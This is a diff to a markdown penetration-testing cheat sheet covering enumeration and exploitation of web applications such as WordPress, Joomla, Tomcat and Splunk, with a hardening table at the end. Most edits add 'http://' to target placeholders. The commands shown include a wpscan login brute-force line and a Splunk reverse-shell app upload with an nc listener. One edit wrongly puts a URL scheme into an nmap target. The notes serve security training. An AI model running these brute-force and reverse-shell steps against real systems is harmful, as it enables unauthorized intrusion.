@@ -19,7 +19,7 @@ cd ..
 source eyewitness-venv/bin/activate
 
 # SCAN using nmap XML results output
-python Python/EyeWitness.py --web -d ../scan_eyewitness -x ../<NMAP>.xml
+python Python/EyeWitness.py --web -d ../scan_eyewitness -x ../<NMAP_XML>
 ```
 
 ## Wordpress
@@ -36,7 +36,7 @@ Disallow: /wp-admin/
 Allow: /wp-admin/admin-ajax.php
 Disallow: /wp-content/uploads/wpforms/
 
-Sitemap: https://inlanefreight.local/wp-sitemap.xml
+Sitemap: https://<DOMAIN>/wp-sitemap.xml
 ```
 
 **Folders**
@@ -57,8 +57,8 @@ Sitemap: https://inlanefreight.local/wp-sitemap.xml
 
 **Page Source**
 ```bash
-curl -so- '<TARGET>/robots.txt'
-curl -s <TARGET> | grep -i -e WordPress -e themes -e plugins
+curl -so- 'http://<TARGET>/robots.txt'
+curl -s http://<TARGET> | grep -i -e WordPress -e themes -e plugins
 ```
 
 **WPScan**
@@ -67,13 +67,13 @@ curl -s <TARGET> | grep -i -e WordPress -e themes -e plugins
 
 ```bash
 # Generic enumeration
-sudo wpscan -t 20 --api-token <API_TOKEN> --url <TARGET> --enumerate
+sudo wpscan -t 20 --api-token <API_TOKEN> --url http://<TARGET> --enumerate
 
 # Enumerate all plugins
-sudo wpscan -t 20 --api-token <API_TOKEN> --url <TARGET> --enumerate ap
+sudo wpscan -t 20 --api-token <API_TOKEN> --url http://<TARGET> --enumerate ap
 
 # Login brute-force
-sudo wpscan -t 20 --url <TARGET> --password-attack xmlrpc -U <USER> -P /usr/share/wordlists/rockyou.txt
+sudo wpscan -t 20 --url http://<TARGET> --password-attack xmlrpc -U <USER> -P /usr/share/wordlists/rockyou.txt
 ```
 
 ## Joomla
@@ -103,16 +103,16 @@ Disallow: /tmp/
 
 **Page Source**
 ```bash
-curl -s <TARGET>/README.txt
-curl -s <TARGET>/administrator/manifests/files/joomla.xml | xmllint --format -
-curl -s <TARGET> | grep -i Joomla
+curl -s http://<TARGET>/README.txt
+curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | xmllint --format -
+curl -s http://<TARGET> | grep -i Joomla
 ```
 
 **Scanning**
 ```bash
-uv tool install droopescan
+uv tool install git+https://github.com/malmassari/droopescan.git@py3.13-compat --python 3.11
 
-droopescan scan joomla --url <TARGET>
+droopescan scan joomla --url http://<TARGET>
 ```
 
 ## Drupal
@@ -124,17 +124,17 @@ droopescan scan joomla --url <TARGET>
 
 **Page Source**
 ```bash
-curl -s <TARGET> | grep -i Drupal
+curl -s http://<TARGET> | grep -i Drupal
 
 # Version (older Drupals only)
-curl -s <TARGET> | grep -m2 ""
+curl -s http://<TARGET> | grep -m2 ""
 ```
 
 **Scanning**
 ```bash
-uv tool install droopescan
+uv tool install git+https://github.com/malmassari/droopescan.git@py3.13-compat --python 3.11
 
-droopescan scan drupal --url <TARGET>
+droopescan scan drupal --url http://<TARGET>
 ```
 
 ## Tomcat
@@ -145,18 +145,18 @@ droopescan scan drupal --url <TARGET>
 
 **Apache Jserv and Tomcat**
 ```bash
-sudo nmap -sV -p 8009,8080 <TARGET>
+sudo nmap -sV -p 8009,8080 http://<TARGET>
 ```
 
 **Page Source**
 ```bash
-curl -s <TARGET>/invalid | grep Tomcat 
-curl -s <TARGET>/docs/ | grep Tomcat 
+curl -s http://<TARGET>/invalid | grep Tomcat 
+curl -s http://<TARGET>/docs/ | grep Tomcat 
 ```
 
 **Find Web Manager Pages `/manager` or `host-manager`**
 ```bash
-feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u <TARGET>
+feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://<TARGET>
 ```
 
 **Brute-Force Web Manager**
@@ -223,7 +223,7 @@ sudo nmap -sV -p 8000,8089 <TARGET>
 
 **Uploading Callback Shell**
 ```bash
-<TARGET>/en-US/app/launcher/home
+http://<TARGET>/en-US/app/launcher/home
 
 # Splunk Reverse Shell
 git clone https://github.com/0xjpuff/reverse_shell_splunk.git
@@ -238,7 +238,7 @@ tar -cvzf updater.tar.gz reverse_shell_splunk/
 nc -lvnp 8443
 
 # NOTE: uploading the app, causes it run immediately; ensure `nc` is running
-# From <TARGET>/en-US/manager/search/apps/local > Install app from file
+# From http://<TARGET>/en-US/manager/search/apps/local > Install app from file
 ```
 
 ## PRTG Network Monitor
@@ -249,7 +249,7 @@ sudo nmap -sV -p 80,443,8080 <TARGET>
 ```
 
 ```bash
-curl -s <TARGET> | grep -i Version
+curl -s http://<TARGET> | grep -i Version
 ```
 
 ## osTicket
@@ -320,14 +320,14 @@ sudo nmap -sV -p 389,636 <TARGET>
 
 ## Harderning
 
-| Application                                                                                                                               | Hardening Category    | Discussion                                                                                                                                                                                                                            |
-| ----------------------------------------------------------------------------------------------------------------------------------------- | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [WordPress](https://wordpress.org/support/article/hardening-wordpress/)                                                                   | Security monitoring   | Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more                                      |
-| [Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)                                                                        | Access controls       | A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.inlanefreight.local/administrator?thisismysecretkey` |
-| [Drupal](https://www.drupal.org/docs/security-in-drupal)                                                                                  | Access controls       | Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login)                                                                                                                           |
-| [Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)                                                                    | Access controls       | Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.                            |
-| [Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)                                                                     | Access controls       | Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth)                                                                                                                        |
-| [Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)                                                  | Regular updates       | Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication                                                                                                                        |
-| [PRTG Network Monitor](https://helpdesk.paessler.com/en/support/solutions/articles/76000062446-what-security-features-does-prtg-include-) | Secure authentication | Make sure to stay up-to-date and change the default PRTG password                                                                                                                                                                     |
-| osTicket                                                                                                                                  | Access controls       | Limit access from the internet if possible                                                                                                                                                                                            |
-| [GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)                                               | Secure authentication | Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains                                                                                                                |
+| Application                                                                                                                               | Hardening Category    | Discussion                                                                                                                                                                                                                 |
+| ----------------------------------------------------------------------------------------------------------------------------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| [WordPress](https://wordpress.org/support/article/hardening-wordpress/)                                                                   | Security monitoring   | Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more                           |
+| [Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)                                                                        | Access controls       | A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.<DOMAIN>/administrator?thisismysecretkey` |
+| [Drupal](https://www.drupal.org/docs/security-in-drupal)                                                                                  | Access controls       | Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login)                                                                                                                |
+| [Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)                                                                    | Access controls       | Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.                 |
+| [Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)                                                                     | Access controls       | Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth)                                                                                                             |
+| [Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)                                                  | Regular updates       | Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication                                                                                                             |
+| [PRTG Network Monitor](https://helpdesk.paessler.com/en/support/solutions/articles/76000062446-what-security-features-does-prtg-include-) | Secure authentication | Make sure to stay up-to-date and change the default PRTG password                                                                                                                                                          |
+| osTicket                                                                                                                                  | Access controls       | Limit access from the internet if possible                                                                                                                                                                                 |
+| [GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)                                               | Secure authentication | Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains                                                                                                     |
